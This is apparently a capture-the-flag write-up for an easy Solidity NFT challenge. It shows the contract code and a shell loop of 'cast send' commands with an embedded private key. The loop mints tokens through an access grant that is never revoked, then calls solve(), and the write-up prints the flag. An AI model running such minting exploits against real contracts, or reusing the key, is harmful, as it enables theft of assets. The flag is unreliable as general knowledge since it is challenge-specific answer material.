# Easy NFT (56 solves) (111 points) (First Blood)

```
NFT market was slowly booming and Tony's friends were showing off their NFT holdings. Tony had finally whitelisted a NFT project, he's anxiously waiting for minting his first NFT.
```

The goal of this challenge is to become the owner of NFT 0 to 19

```
    function solve() external {
        solved = true;
        for (uint256 i = 0; i < 20; i++) {
            if (et.ownerOf(i) != PLAYER) {
                solved = false;
            }
        }
    }
```

This is another easy challenge, access is set to true for `player` in the constructor, and there's nothing to set it back to false

```solidity
    constructor(address player) ERC721("EazyToken", "ET") {
        for (uint160 i = 0; i < 10; i++) {
            _mint(address(i), i);
        }
        access[player] = true;
    }

    function mint(address to, uint256 tokenId) public {
        require(access[_msgSender()], "ET: caller is not accessed");
        _mint(to, tokenId);
    }
```

So just call mint() 20 times :

```
# for i in $(seq 0 19); do cast send 0xe735883F17F1a8f7A6f7B18dfD56Ad9d1a1d9eb4 -r http://rpc.ctf.so:8545/xxpkcuvkkfoccbqggnijixjv/main --private-key 0x70958392a79789ba95d66965666024e8081a6d3886acb0a9f23c3a454f8fff96 "mint(address,uint256)" 0xbEDaF89380394fE4b758d3c12DA3C2C792DcE1B3 $i --nonce $i; done

# cast send 0xca0e5e1Cc02b3e0C296e357E96271Ba9D6f715e9 "solve()" -r http://rpc.ctf.so:8545/xxpkcuvkkfoccbqggnijixjv/main --private-key 0x70958392a79789ba95d66965666024e8081a6d3886acb0a9f23c3a454f8fff96
```

### Flag

```
blaz{e1111zzzzzzzzzz2zzzzzzzz22z2zz}
```


